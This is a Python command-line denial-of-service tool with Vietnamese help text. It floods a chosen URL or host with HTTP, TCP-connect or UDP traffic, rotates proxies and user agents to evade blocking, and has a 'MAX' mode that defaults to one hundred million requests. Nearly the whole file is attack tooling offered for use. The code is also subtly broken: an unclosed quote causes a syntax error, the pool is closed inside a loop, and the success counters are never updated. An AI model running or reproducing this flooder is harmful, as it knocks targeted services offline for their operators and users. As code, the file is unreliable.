import random
import requests
import socket
import struct
import argparse
import time
from multiprocessing import Pool

def send_http_request(url, headers, body, timeout, proxy):
    try:
        response = requests.request('GET', url, headers=headers, data=body, timeout=timeout, proxies={'http': proxy, 'https': proxy})
        success = True if response.status_code == 200 else False
        return {'success': success, 'statusCode': response.status_code, 'proxy': proxy}
    except:
        return {'success': False, 'statusCode': 0, 'proxy': proxy}

def send_syn_connect(pinghost, pingport, timeout):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout / 1000)
        s.connect((pinghost, int(pingport)))
        return {'success': True}
    except Exception as e:
        return {'success': False}

def send_udp_connect(pinghost, udpport, timeout):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout / 1000)
        packet = struct.pack('BBHHH', 0x00, 0x00, 0x13, 0x37, 0x00)
        s.sendto(packet, (pinghost, int(udpport)))
        return {'success': True}
    except:
        return {'success': False}

def max_damage():
    parser = argparse.ArgumentParser(description='MAX')
    parser.add_argument('url', type=str, help='URL mà bạn muốn tấn công')
    parser.add_argument('--useragents', type=str, default='ua.txt', help='Đường dẫn đến file useragents.txt')
    parser.add_argument('--proxies', type=str, default='proxy.txt', help='Đường dẫn đến file proxies.txt')
    parser.add_argument('--timeout', type=int, default=15000, help='Timeout (ms)')
    parser.add_argument('--number', type=int, default=100000000, help='Số lượng request muốn gửi')
    parser.add_argument('--concurrency', type=int, default=100, help='Số lượng request đồng thời muốn gửi')
    args = parser.parse_args()

    with open(args.useragents, 'r') as f:
        user_agents = f.readlines()
    user_agents = [ua.strip() for ua in user_agents]

    with open(args.proxies, 'r') as f:
        proxies = f.readlines()
    proxies = [p.strip() for p in proxies]

    print(f'Đang gửi {args.number} requests đến {args.url} với mức độ nghịch đảo tối đa và timeout là {args.timeout} ms với số lượng request đồng thời là {args.concurrency}.')

    current_proxy_index = 0
    completed_requests = 0
    successful_requests = 0

    def send_http_request_wrapper(*args):
        return send_http_request(*args, proxies[current_proxy_index])

    with Pool(processes=args.concurrency) as pool:
        for i in range(args.number):
            headers = {'User-Agent': user_agents[random.randint(0, len(user_agents)-1)]}
            pool.apply_async(send_http_request_wrapper, (args.url, headers, '', args.timeout))
            pool.close()
        pool.join()

    print(f'Hoàn thành gửi {args.number} requests với {successful_requests} requests thành công.') 

def main():
    options = [
        'HTTP',
        'SYN',
        'UDP',
        'MAX'
    ]

    parser = argparse.ArgumentParser(description=f'Xin chào! Bạn muốn làm gì? Tùy chọn: {", ".join(options)}')
    parser.add_argument('--option', type=str, choices=options, help='Chọn một trong các tùy chọn sau đây.', required=True)
    args = parser.parse_args()

    if args.option == 'HTTP':
        parser = argparse.ArgumentParser(description='HTTP')
        parser.add_argument('url, type=str, help='URL mà bạn muốn tấn công')
        parser.add_argument('--header', type=str, help='Header của request')
        parser.add_argument('--body', type=str, help='Body của request')
        parser.add_argument('--timeout', type=int, default=5000, help='Timeout (ms)')
        parser.add_argument('--number', type=int, default=1, help='Số lượng request muốn gửi')
        parser.add_argument('--concurrency', type=int, default=1, help='Số lượng request đồng thời muốn gửi')
        parser.add_argument('--useragents', type=str, default='useragents.txt', help='Đường dẫn đến file useragents.txt')
        parser.add_argument('--proxies', type=str, default='proxies.txt', help='Đường dẫn đến file proxies.txt')
        args = parser.parse_args()

        with open(args.useragents, 'r') as f:
            user_agents = f.readlines()
        user_agents = [ua.strip() for ua in user_agents]

        with open(args.proxies, 'r') as f:
            proxies = f.readlines()
        proxies = [p.strip() for p in proxies]

        headers = {}
        if args.header:
            headers_list = args.header.split('\n')
            for h in headers_list:
                h_parts = h.split(':')
                headers[h_parts[0].strip()] = h_parts[1].strip()

        print(f'Đang gửi {args.number} requests đến {args.url} với timeout là {args.timeout} ms, số lượng request đồng thời là {args.concurrency}, và header(s): {headers}.')

        current_proxy_index = 0
        completed_requests = 0
        successful_requests = 0

        def send_http_request_wrapper(*args):
            return send_http_request(*args, proxies[current_proxy_index])

        with Pool(processes=args.concurrency) as pool:
            for i in range(args.number):
                headers = {'User-Agent': user_agents[random.randint(0, len(user_agents)-1)]}
                if args.header:
                    headers.update(headers)
                pool.apply_async(send_http_request_wrapper, (args.url, headers, args.body, args.timeout))

            pool.close()
            pool.join()

        print(f'Hoàn thành gửi {args.number} requests với {successful_requests} requests thành công.')
            
    elif args.option == 'SYN':
        parser = argparse.ArgumentParser(description='SYN')
        parser.add_argument('pinghost', type=str, help='Địa chỉ IP hoặc tên miền để ping')
        parser.add_argument('--pingport', type=int, default=80, help='Cổng để ping')
        parser.add_argument('--timeout', type=int, default=5000, help='Timeout (ms)')
        parser.add_argument('--number', type=int, default=1, help='Số lượng request muốn gửi')
        parser.add_argument('--concurrency', type=int, default=1, help='Số lượng request đồng thời muốn gửi')
        args = parser.parse_args()

        print(f'Đang gửi {args.number} requests SYN CONNECT đến {args.pinghost}:{args.pingport} với timeout là {args.timeout} ms và số lượng request đồng thời là {args.concurrency}.')
        with Pool(processes=args.concurrency) as pool:
            for i in range(args.number):
                pool.apply_async(send_syn_connect, (args.pinghost, args.pingport, args.timeout))

            pool.close()
            pool.join()

        print('Hoàn thành gửi requests SYN CONNECT.')
    
    elif args.option == 'UDP':
        parser = argparse.ArgumentParser(description='UDP')
        parser.add_argument('pinghost', type=str, help='Địa chỉ IP hoặc tên miền để gửi UDP CONNECT')
        parser.add_argument('--udpport', type=int, default=80, help='Cổng để gửi UDP CONNECT')
        parser.add_argument('--timeout', type=int, default=5000, help='Timeout (ms)')
        parser.add_argument('--number', type=int, default=1, help='Số lượng request muốn gửi')
        parser.add_argument('--concurrency', type=int, default=1, help='Số lượng request đồng thời muốn gửi')
        args = parser.parse_args()

        print(f'Đang gửi {args.number} requests UDP CONNECT đến {args.pinghost}:{args.udpport} với timeout là {args.timeout} ms và số lượng request đồng thời là {args.concurrency}.')

        with Pool(processes=args.concurrency) as pool:
            for i in range(args.number):
                pool.apply_async(send_udp_connect, (args.pinghost, args.udpport, args.timeout))

            pool.close()
            pool.join()

        print('Hoàn thành UDP.')
    
    elif args.option == 'MAX':
        max_damage()

if __name__ == '__main__':
    main()
